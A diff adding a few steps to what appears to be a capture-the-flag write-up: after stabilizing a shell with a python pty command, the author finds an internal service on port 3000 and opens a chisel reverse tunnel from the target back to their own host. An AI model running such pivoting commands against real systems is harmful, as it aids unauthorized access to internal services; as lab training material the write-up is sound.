@@ -76,3 +76,22 @@ Here's how I stabilized my shell
 python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 
+Checking the internal ports avaiable shows that a service is running on port 3000
+![image](https://user-images.githubusercontent.com/127159644/236716251-7e6f788d-86ce-4c4b-93a9-bad02d10b5a0.png)
+
+Lets port forward using chisel shall we 🙂
+![image](https://user-images.githubusercontent.com/127159644/236716419-626c5220-9a6a-4150-aeab-5ff3d51a0891.png)
+
+```bash
+Command:
+
+Host: chisel server -p 9001 --reverse
+Target: ./chisel client {host}:9001 R:3000:127.0.0.1:3000 &
+```
+
+We can confirm that it was successfully port forwarded by scanning our host
+![image](https://user-images.githubusercontent.com/127159644/236716902-a733ac13-25e0-4a9f-9c1e-e3b7e3f67f08.png)
+
+Now lets see what it contains or rather what it is 😅
+
+
